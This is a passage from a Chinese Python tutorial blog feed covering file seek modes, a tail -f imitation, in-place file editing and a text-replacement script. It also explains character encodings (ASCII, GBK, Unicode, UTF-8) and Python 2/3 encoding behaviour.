title="f.seek(n,模式)"></a>f.seek(n,模式)</h2><p>n指的是移动bytes个数，模式有三种(0,1,2)，只有0模式可以在t下使用，1、2必须在b模式下用</p><p>如果指针移动到末尾就不会再次移动</p><h3 id="0：参照物文件开头的位置"><a href="#0：参照物文件开头的位置" class="headerlink" title="0：参照物文件开头的位置"></a>0：参照物文件开头的位置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user文件内容:123你好</span></span><br><span class="line">f = open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">3</span>,<span class="number">0</span>) <span class="comment"># 文件指针在第3个bytes</span></span><br><span class="line">print(f.tell()) <span class="comment"># 3</span></span><br><span class="line">f.seek(<span class="number">2</span>,<span class="number">0</span>) <span class="comment"># 文件指针在第2个bytes</span></span><br><span class="line">print(f.tell()) <span class="comment"># 2 注意：这里是参照文件开头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果指针移动到中文3个字节，会导致转码失败</span></span><br><span class="line">f.seek(<span class="number">4</span>,<span class="number">0</span>) <span class="comment"># 第四个字节是中文’你‘的第一个字节</span></span><br><span class="line">print(f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 由于不完整读取不到第一个字节，转码会导致报错</span></span><br></pre></td></tr></table></figure><h3 id="1：参照物当前文件指针位置"><a href="#1：参照物当前文件指针位置" class="headerlink" title="1：参照物当前文件指针位置"></a>1：参照物当前文件指针位置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">3</span>,<span class="number">0</span>) <span class="comment"># 文件指针在第3个bytes</span></span><br><span class="line">print(f.tell()) <span class="comment"># 3</span></span><br><span class="line">f.seek(<span class="number">2</span>,<span class="number">1</span>) <span class="comment"># 文件指针在第5个bytes</span></span><br><span class="line">print(f.tell()) <span class="comment"># 5 注意：这里是参照文件指针当前位置</span></span><br></pre></td></tr></table></figure><h3 id="2：参照物是文件末尾，应该倒着移动-负数为倒着移"><a href="#2：参照物是文件末尾，应该倒着移动-负数为倒着移" class="headerlink" title="2：参照物是文件末尾，应该倒着移动(负数为倒着移)"></a>2：参照物是文件末尾，应该倒着移动(负数为倒着移)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user:123你好</span></span><br><span class="line">f = open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">-3</span>,<span class="number">2</span>)</span><br><span class="line">print(f.tell()) <span class="comment"># 6</span></span><br><span class="line">print(f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 好</span></span><br></pre></td></tr></table></figure><h2 id="仿tail-f程序"><a href="#仿tail-f程序" class="headerlink" title="仿tail -f程序"></a>仿<code>tail -f</code>程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 使用b模式是为了增加适用范围</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;access.log&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 指针移动到文件末尾</span></span><br><span class="line">    f.seek(<span class="number">0</span>,<span class="number">2</span>) <span class="comment"># 通常seek的1和2模式不能在t模式下使用，但0移动除外</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = f.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(res) == <span class="number">0</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>) <span class="comment"># 让程序沉睡1秒</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(res,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="修改文件内容"><a href="#修改文件内容" class="headerlink" title="修改文件内容"></a>修改文件内容</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件a.txt内容如下</span></span><br><span class="line">张一蛋     山东    <span class="number">179</span>    <span class="number">49</span>    <span class="number">12344234523</span></span><br><span class="line">李二蛋     河北    <span class="number">163</span>    <span class="number">57</span>    <span class="number">13913453521</span></span><br><span class="line">王全蛋     山西    <span class="number">153</span>    <span class="number">62</span>    <span class="number">18651433422</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行操作</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;r+t&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">9</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;&lt;妇女主任&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件修改后的内容如下</span></span><br><span class="line">张一蛋&lt;妇女主任&gt; <span class="number">179</span>    <span class="number">49</span>    <span class="number">12344234523</span></span><br><span class="line">李二蛋     河北    <span class="number">163</span>    <span class="number">57</span>    <span class="number">13913453521</span></span><br><span class="line">王全蛋     山西    <span class="number">153</span>    <span class="number">62</span>    <span class="number">18651433422</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 强调：</span></span><br><span class="line"><span class="comment"># 1、硬盘空间是无法修改的,硬盘中数据的更新都是用新内容覆盖旧内容</span></span><br><span class="line"><span class="comment"># 2、内存中的数据是可以修改的</span></span><br></pre></td></tr></table></figure><p><strong>文件对应的是硬盘空间,硬盘不能修改对应着文件本质也不能修改</strong></p><p><strong>文件的内容可以修改大致的思路是计算机将硬盘中文件内容读入内存,然后在内存中修改完毕后再覆盖回硬盘</strong></p><h2 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h2><p>目前文件编辑器大多采用此方案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 将文件整体读入内存</span></span><br><span class="line">    res = f.read()</span><br><span class="line">    <span class="comment"># 修改文件</span></span><br><span class="line">    data = res.replace(<span class="string">&#x27;张一蛋&#x27;</span>,<span class="string">&#x27;张全蛋&#x27;</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时修改后的文件在内存中，就可以打开另一个句柄</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data) <span class="comment"># 将修改后的内容写入硬盘</span></span><br></pre></td></tr></table></figure><p>实现思路：将文件内容发一次性全部读入内存,然后在内存中修改完毕后再覆盖写回原文件<br>优点: 在文件修改过程中同一份数据只有一份<br>缺点: 会过多地占用内存</p><h2 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f,\</span><br><span class="line">    open(<span class="string">&#x27;.a.txt.swap&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="comment"># .a.txt.swap 是一种命名规范 .是隐藏文件 .swap是缓存文件</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        f1.write(line.replace(<span class="string">&#x27;李二蛋&#x27;</span>,<span class="string">&#x27;牛铁蛋&#x27;</span>))</span><br><span class="line">os.remove(<span class="string">&#x27;a.txt&#x27;</span>) <span class="comment"># 删除源文件</span></span><br><span class="line">os.rename(<span class="string">&#x27;.a.txt.swap&#x27;</span>,<span class="string">&#x27;a.txt&#x27;</span>) <span class="comment"># 将中间文件文件名改为源文件</span></span><br></pre></td></tr></table></figure><p>实现思路：以读的方式打开原文件,以写的方式打开一个临时文件,一行行读取原文件内容,修改完后写入临时文件…,删掉原文件,将临时文件重命名原文件名<br>优点: 不会占用过多的内存<br>缺点: 在文件修改过程中同一份数据存了两份</p><h2 id="文本内容替换案例"><a href="#文本内容替换案例" class="headerlink" title="文本内容替换案例"></a>文本内容替换案例</h2><p>使用案例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python your_script.py old_str new_str filename</span><br></pre></td></tr></table></figure><p>查找filename文件内的old_str替换为new_str</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># sys.argv从外部接受参数</span></span><br><span class="line"><span class="comment"># 第一个输入参数是 全局替换.py 的文件名</span></span><br><span class="line">old_str = sys.argv[<span class="number">1</span>] <span class="comment"># 第2个输入参数</span></span><br><span class="line">new_str = sys.argv[<span class="number">2</span>] <span class="comment"># 第3个输入参数</span></span><br><span class="line">filename = sys.argv[<span class="number">3</span>] <span class="comment"># 第4个输入参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(filename),mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file,\</span><br><span class="line">    open(<span class="string">&#x27;.&#123;&#125;.swap&#x27;</span>.format(filename),mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> sfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        sfile.write(line.replace(old_str,new_str))</span><br><span class="line">os.remove(filename)</span><br><span class="line">os.rename(<span class="string">&#x27;.&#123;&#125;.swap&#x27;</span>.format(filename),filename)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201120005820502.png" alt="image-20201120005820502"></p><hr><h1 id="补充的知识"><a href="#补充的知识" class="headerlink" title="补充的知识"></a>补充的知识</h1><p>在最初的时候，换行是由两个字符共同完成的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;\r\n&#x27;</span></span><br></pre></td></tr></table></figure><p><code>\r</code>完成回到行首，<code>\n</code>完成到达下一行</p><p>于是乎操作系统对于这个就有了不同的理解，例如linux和mac平台认为直接使用<code>\n</code>来代替会到行首加下一行的工作即可，而win平台则坚持使用了<code>\r\n</code>的方式，不过对于python3而言，我们编写代码直接使用<code>\n</code>就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.python的字符编码</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/15.python%E7%9A%84%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/15.python%E7%9A%84%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>字符串类型、文本文件的内容都是由字符组成的，但凡涉及到字符的存取，都需要考虑字符编码的问题。</p><p>字符编码这个知识点的典型特征就是理论多、结论少，但对于开发而言只需要记住结论即可，下面让我们来一点点介绍它</p><a id="more"></a><hr><h1 id="前要知识"><a href="#前要知识" class="headerlink" title="前要知识"></a>前要知识</h1><h2 id="三大核心硬件"><a href="#三大核心硬件" class="headerlink" title="三大核心硬件"></a>三大核心硬件</h2><p>所有软件都是运行硬件之上的，与运行软件相关的三大核心硬件为cpu、内存、硬盘</p><ul><li>软件运行前，软件的代码及其相关数据都是存放于硬盘中的</li><li>任何软件的启动都是将数据从硬盘中读入内存，然后cpu从内存中取出指令并执行</li><li>软件运行过程中产生的数据最先都是存放于内存中的，若想永久保存软件产生的数据，则需要将数据由内存写入硬盘</li></ul><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-48e25e7f03030e066f8fcaf4750cc892_720w.jpg" alt="img"></p><h2 id="文本编辑器读取文件内容的流程"><a href="#文本编辑器读取文件内容的流程" class="headerlink" title="文本编辑器读取文件内容的流程"></a>文本编辑器读取文件内容的流程</h2><ol><li><p>启动一个文件编辑器（文本编辑器如nodepad++，pycharm，word）</p></li><li><p>文件编辑器会将文件内容从硬盘读入内存</p></li><li><p>文本编辑器会将刚刚读入内存中的内容显示到屏幕上</p></li></ol><h2 id="python解释器执行文件的流程"><a href="#python解释器执行文件的流程" class="headerlink" title="python解释器执行文件的流程"></a>python解释器执行文件的流程</h2><p>python源代码存放的也是文本，所以也是文本文件，过程与文本编辑器类似，以python test.py为例，执行流程如下</p><ol><li><p>启动python解释器，此时就相当于启动了一个文本编辑器</p></li><li><p>python解释器相当于文本编辑器，从硬盘上将test.py的内容读入到内存中</p></li><li><p>python解释器解释执行刚刚读入的内存的内容，开始识别python语法</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python解释器与文件本编辑的异同如下</p><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><p>前两个阶段二者完全一致，都是将硬盘中文件的内容读入内存，详解如下</p><p>python解释器是解释执行文件内容的，因而python解释器具备读py文件的功能，这一点与文本编辑器一样</p><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><p>在阶段3时，针对内存中读入的内容处理方式不同，详解如下</p><p>文本编辑器将文件内容读入内存后，是为了显示或者编辑，根本不去理会python的语法，而python解释器将文件内容读入内存后，可不是为了给你瞅一眼python代码写的啥，而是为了执行python代码、会识别python语法）</p><h3 id="与字符编码相关"><a href="#与字符编码相关" class="headerlink" title="与字符编码相关"></a>与字符编码相关</h3><p>python在前两个阶段，将文本文件导入到python解释器之前保证不乱码，以及在第三阶段识别变量语法的时候保证不乱码</p><hr><h1 id="字符编码介绍"><a href="#字符编码介绍" class="headerlink" title="字符编码介绍"></a>字符编码介绍</h1><p>现在人与计算机交互的时候，用的都是人类能够读懂的字符，而其实计算机本身只能识别二进制数</p><blockquote><p>二进制数即由0和1组成的数字，例如010010101010。计算机是基于电工作的，电的特性即高低电平，人类从逻辑层面将高电平对应为数字1,低电平对应为数字0，这直接决定了计算机可以识别的是由0和1组成的数字</p></blockquote><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><p>由于计算机只能识别二进制数，所以人类的字符到计算机中的二进制数需要经历一个翻译的过程</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-80b925e192579faa59dcffbb046535a4_720w.jpg" alt="img"></p><p>翻译过程必须参照一个特定的标准，这个标准被称为<strong>字符编码表</strong>，该表存放的就是字符与数字的一一对应关系，而这个翻译现在使用更加专业的名词，就被称为编码</p><h2 id="字符编码表发展历史"><a href="#字符编码表发展历史" class="headerlink" title="字符编码表发展历史"></a>字符编码表发展历史</h2><h3 id="阶段一-：美国一家独大"><a href="#阶段一-：美国一家独大" class="headerlink" title="阶段一 ：美国一家独大"></a>阶段一 ：美国一家独大</h3><p>现代计算机起源于美国，所以最先考虑仅仅是让计算机识别英文字符，于是诞生了ASCII表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ASCII表的特点:</span></span><br><span class="line">    <span class="number">1</span>、采用ASCII码采用<span class="number">8</span>位二进制数对应一个英文字符，且只有英文字符与数字的一一对应关系</span><br><span class="line">    <span class="number">2</span>、一个英文字符对应<span class="number">1</span>Bytes，<span class="number">1</span>Bytes=<span class="number">8</span>bit，<span class="number">8</span>bit最多包含<span class="number">256</span>个数字，可以对应<span class="number">256</span>个字符，足够表示所有英文字符</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201101100333122.png" alt="image-20201101100333122"></p><h3 id="阶段二：诸侯割据、天下大乱"><a href="#阶段二：诸侯割据、天下大乱" class="headerlink" title="阶段二：诸侯割据、天下大乱"></a>阶段二：诸侯割据、天下大乱</h3><p>由于起初计算机只认识英文，给国人的使用带来了很多的不便，所以为了让计算机能够识别中文和英文，中国人定制了GBK</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GBK表的特点：</span></span><br><span class="line">    <span class="number">1</span>、由于中文字符较多，GBK选择使用<span class="number">16</span>位二进制数存储，但只有中文字符、英文字符与数字的一一对应关系</span><br><span class="line">    <span class="number">2</span>、一个英文字符对应<span class="number">1</span>Bytes</span><br><span class="line">       一个中文字符对应<span class="number">2</span>Bytes   </span><br><span class="line">       补充说明：</span><br><span class="line">       <span class="number">1</span>Bytes=<span class="number">8</span>bit，<span class="number">8</span>bit最多包含<span class="number">256</span>个数字，可以对应<span class="number">256</span>个字符，足够表示所有英文字符</span><br><span class="line">       <span class="number">2</span>Bytes=<span class="number">16</span>bit，<span class="number">16</span>bit最多包含<span class="number">65536</span>个数字，可以对应<span class="number">65536</span>个字符，足够表示所有中文字符</span><br></pre></td></tr></table></figure><p>每个国家都各自的字符，为让计算机能够识别自己国家的字符外加英文字符，各个国家都制定了自己的字符编码表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Shift_JIS表的特点：</span></span><br><span class="line">    <span class="number">1</span>、只有日文字符、英文字符与数字的一一对应关系</span><br><span class="line"><span class="comment"># Euc-kr表的特点：</span></span><br><span class="line">    <span class="number">1</span>、只有韩文字符、英文字符与数字的一一对应关系</span><br></pre></td></tr></table></figure><p>此时,美国人用的计算机里使用字符编码标准是ASCII、中国人用的计算机里使用字符编码标准是GBK、日本人用的计算机里使用字符编码标准是Shift_JIS,如下图所示，</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-19bac7b0910652bbd1f7e026683a28be_720w.jpg" alt="img"></p><p>字符编码发展到了这个阶段，可以用一句话概括：诸侯割据、天下大乱</p><h3 id="阶段三：分久必合"><a href="#阶段三：分久必合" class="headerlink" title="阶段三：分久必合"></a>阶段三：分久必合</h3><p>阶段二出现了一个问题，每个地方的计算机系统，就存在了地域间隔的情况，不利于跨国之间的文件传输，于是乎1990年开始研发，1994年正式公布的万国牌编码规则<code>unicode</code>就成为了解决方案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 存在所有语言中的所有字符与数字的一一对应关系,即兼容万国字符</span></span><br><span class="line"><span class="comment">#2. 采用16位二进制数(2Bytes)进行对应，个别生僻字采用4Bytes、8Bytes</span></span><br></pre></td></tr></table></figure><p>现在还有很多的老文件并不支持unicode编码，unicode编码还支持与其他编码方式进行转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文本编辑器输入任何字符都是最新存在于内存中，是unicode编码的，存放于硬盘中，则可以转换成任意其他编码，只要该编码可以支持相应的字符</span></span><br><span class="line">英文字符---&gt;unciode格式的数字---&gt;ASCII格式的数字</span><br><span class="line">中文字符、英文字符---&gt;unicode格式的数字---&gt;gbk格式的数字</span><br><span class="line">日文字符、英文字符---&gt;unicode格式的数字---&gt;shift-JIS格式的数字</span><br><span class="line"><span class="comment"># 老的编码都可以转为unicode，但是不能互相转(例如：因为gbk格式的汉字并不出现在ASCII格式中，但他们都支持英文，所以可以英文转换)</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-484a43054d2217ed11c7d5d9170675f8_720w.jpg" alt="img"></p><p>由字符转换成内存中的unicode，以及由unicode转换成其他编码的过程，都称为编码encode</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-08a12814397a5a6d3e530a66cf2dbc02_720w.jpg" alt="img"></p><p>由内存中的unicode转换成字符，以及由其他编码转换成unicode的过程，都称为解码decode</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-5f7b25aaeb4ccc913f0c23d586acdbab_720w.jpg" alt="img"></p><h3 id="UTF-8的由来"><a href="#UTF-8的由来" class="headerlink" title="UTF-8的由来"></a>UTF-8的由来</h3><p>理论上是可以将内存中unicode格式的二进制直接存放于硬盘中的，但由于unicode固定使用两个字节来存储一个字符，如果多国字符中包含大量的英文字符时，使用unicode格式存放会额外占用一倍空间（英文字符其实只需要用一个字节存放即可），然而空间占用并不是最致命的问题，最致命地是当我们由内存写入硬盘时会额外耗费一倍的时间，所以将内存中的unicode二进制写入硬盘或者基于网络传输时必须将其转换成一种精简的格式，这种格式即utf-8（全称Unicode Transformation Format，即unicode的转换格式）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多国字符—√—》内存（unicode格式的二进制）——√—》硬盘（utf<span class="number">-8</span>格式的二进制）</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-c2a4ec82d946e4e35645f9782dbc798a_720w.jpg" alt="img"></p><p><strong>那为何在内存中不直接使用utf-8呢？</strong></p><p>utf-8是针对Unicode的可变长度字符编码：一个英文字符占1Bytes，一个中文字符占3Bytes，生僻字用更多的Bytes存储</p><p>unicode更像是一个过渡版本，因为它还需要兼容老编码格式的软件，而我们新开发的软件或文件存入硬盘都采用utf-8格式，等过去几十年，所有老编码的文件都淘汰掉之后，会出现一个令人开心的场景，即硬盘里放的都是utf-8格式，此时unicode便可以退出历史舞台，内存里也改用utf-8，天下重新归于统一</p><hr><h1 id="字符编码-1"><a href="#字符编码-1" class="headerlink" title="字符编码"></a>字符编码</h1><p>内存中固定使用unicode无论输入任何字符都不会发生乱码，我们可以改变的只是存入硬盘时的编码方式，如果编码设置不正确会出现乱码</p><p><strong>存乱了</strong>：存乱了会导致数据丢失，没有解决办法</p><p><strong>取乱了</strong>：取乱了，只需要将编辑器切换为对应的编码格式即可</p><h3 id="文件头指定编码格式-只能控制读取-不能控制编译和写入"><a href="#文件头指定编码格式-只能控制读取-不能控制编译和写入" class="headerlink" title="文件头指定编码格式 - 只能控制读取 不能控制编译和写入"></a>文件头指定编码格式 - 只能控制读取 不能控制编译和写入</h3><p><strong>Python3默认读文件为UTF-8，而Python2默认读文件为ASCII码</strong></p><p>在python文件的首行写上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:gbk(当初文件写入硬盘时采用的编码格式)</span></span><br></pre></td></tr></table></figure><p>解释器会先用默认的编码方式读取文件的首行内容，由于首行是纯英文组成，而任何编码方式都可以识别英文字符</p><p>注意：这里的头文件是告诉编辑器采用什么方式读取，而不是存储，存储还是按照编辑器设置的编码格式存</p><h3 id="python2的str类型unicode编码格式"><a href="#python2的str类型unicode编码格式" class="headerlink" title="python2的str类型unicode编码格式"></a>python2的str类型unicode编码格式</h3><p>Python3的str类型默认直接存成unicode格式，无论如何都不会乱码，但是，python早于unicode格式诞生，所以python2并不会直接把字符串存成unicode格式，会根据平台默认格式来存储，所以可能导致乱码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在字符串前面加个u将字符串存成unicode</span></span><br><span class="line">x = <span class="string">u&#x27;存放为unicode编码&#x27;</span></span><br></pre></td></tr></table></figure><p>python2的解释器在进行解码操作的时候都是以自己为标准的，例如pycharm设置的时候默认使用utf-8，而win平台，在进行解码的时候就会默认使用gbk编码</p><p>PS：文件头只能控制读取，不能控制字符串编译格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">x = <span class="string">&#x27;上&#x27;</span></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>我们将这段代码放入python2中运行，在pycharm中可以成功运行，但是放入windows平台的cmd中，由于会被认为是gbk编码就会导致乱码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201101200407390.png" alt="image-20201101200407390"></p><p>为了正常编译就需要加’u’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">x = <span class="string">u&#x27;上&#x27;</span></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><h3 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h3><p>内存中默认为Unicode，我们人为将Unicode转为gbk，目的是为了支持将编码往其他的平台存放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">x = <span class="string">&#x27;上&#x27;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">res = x.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="comment"># Unicode -&gt; gbk</span></span><br><span class="line">print(res) <span class="comment"># b&#x27;\xc9\xcf&#x27;</span></span><br><span class="line">print(type(res)) <span class="comment"># &lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 解码 - 用什么编码就应该用什么解码</span></span><br><span class="line">print(res.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure><hr><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="GBK编码方式"><a href="#GBK编码方式" class="headerlink" title="GBK编码方式"></a>GBK编码方式</h2><p>已知，计算机识别的是二进制，GBK编码中，英文占用1个Byte位，中文占用两个</p><p>案例 a上b 占用比特位模拟(图中二进制用于模拟原理，并不是真实二进制数)</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201101193123541.png" 